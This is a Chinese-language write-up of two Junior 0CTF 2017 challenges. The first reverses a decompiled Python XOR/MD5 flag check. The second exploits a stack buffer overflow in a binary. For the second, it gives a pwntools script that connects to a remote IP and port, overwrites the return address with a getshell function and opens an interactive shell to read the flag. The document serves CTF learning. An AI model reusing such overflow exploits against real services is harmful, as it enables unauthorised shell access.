# [Junior 0CTF 2017](https://ctf.0ops.sjtu.cn/)
---
#### Written By WOET
---
本来说这次要复习是不去参加的，已经做好了一道题都不做的准备了，然而有参加的学弟问到我相关的问题，然后按捺不住想做的心情，还是注册进去把这两道水题给看了一下。唔……flag就是用来倒的嘛！
## babyre
这一题给出了一个encrypt.pyc的文件，要想拿到flag就得先对它进行反编译才行，找到了uncompyle6这个对pyc文件反编译的工具，得到了如下结果：

```python
# uncompyle6 version 2.14.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Jul 15 2017, 17:16:57) 
# [GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)]
# Embedded file name: encrypt.py
# Compiled at: 2017-12-04 22:59:29
from hashlib import md5

def md5raw(s):
    return bytearray(md5(s).digest())


def xor(a, b):
    assert len(a) == len(b)
    return bytearray([ i ^ j for i, j in zip(a, b) ])


flag = bytearray(raw_input('Show me your flag: '))
assert len(flag) == 32
for i in range(16):
    flag[:16] = xor(flag[:16], md5raw(flag[16:]))
    flag[:16], flag[16:] = flag[16:], flag[:16]

if flag == '\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1<\xa9\\A\xde\xd22\n':
    print 'Right!'
else:
    print 'Wrong!'
# okay decompiling encrypt.pyc
```

由此可见是接收了一个32位的输入，对其进行了一系列花哨的异或操作，检查如果和本地的字符串相等的话，就说明该输入是flag。这里的操作看起来花里胡哨，其实是可逆的操作。因此只需要依样画葫芦就可以找到flag了。

```python
flag = bytearray('\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1<\xa9\\A\xde\xd22\n')
for i in range(16):
    flag[:16], flag[16:] = flag[16:], flag[:16]
    flag[:16] = xor(flag[:16], md5raw(flag[16:]))

print flag
```

然后就可以得到flag为：**flag{1nt3re5tiNg\_F3iste1_ciPh3R}**
## seabreeze's stack
这是一道简单的pwn的题。首先将文件下载下来放到IDA里去进行反汇编。可以看到main函数是这样的结构：

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  work();
  return 0;
}
```

循着这里的调用，找到work函数，发现work函数是这样的结构：

```c++
int work()
{
  char s1; // [esp+Ch] [ebp-3FCh]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  alarm(60u);
  puts("Do you want to get acquainted with top experts and like-minded friends in computer security?");
  __isoc99_scanf("%4s", &s1);
  if ( strcmp(&s1, "Yes!") )
    exit(0);
  puts("Do you want to stride forwards on the road of hacking and explore endless possibilities?");
  __isoc99_scanf("%5s", &s1);
  if ( strcmp(&s1, "Yes!!") )
    exit(0);
  puts("Do you want to challenge world cutting-edge technology and compete with outstanding hackers?");
  __isoc99_scanf("%6s", &s1);
  if ( strcmp(&s1, "Yes!!!") )
    exit(0);
  return __isoc99_scanf("%s", &s1);
}
```

这样看的话根本看不出来flag藏在什么地方。不过考虑到这道题给出了"nc 202.121.178.181 12321"，那就意味着是要连接到远程服务器的，而且本来就是pwn的题，那基本上是要想办法运行"/bin/sh"了。在IDA上寻找了一番，果然发现了名为getshell的函数。

```c++
void __noreturn getshell()
{
  puts("[\x1B[31m*\x1B[0m] Shell Gotten!");
  system("/bin/sh");
  exit(0);
}
```

也就是说只要能想办法运行这个函数就可以了。

注意到work函数中的最后一个scanf是没有指定大小的，也就是说那里存在一个BOF (Buffer Overflow)的漏洞。根据IDA给出的信息，char s1离ebp的距离是**0x3fc**，getshell函数的地址是**080485CB**，也就是只需要填充掉这0x3fc的内容以及save ebp的四个字节，再用getshell的函数地址覆盖掉**ret**就可以了。因为需要进入交互模式下去找flag，所以需要借助Python的pwntools。

Python的利用代码如下：

```python
from pwn import *

p = remote("202.121.178.181", 12321)
payload = "Yes!\nYes!!\nYes!!!\n"
payload += 0x3fc * 'a' + 'bbbb'
payload += p32(0x80485cb)

p.send(payload)
p.interactive()
```

然后在里面找到flag即可：

>$ cat home/stack/flag  
>flag{h4v3\_y0u\_533n\_0ur_p0st3r?}
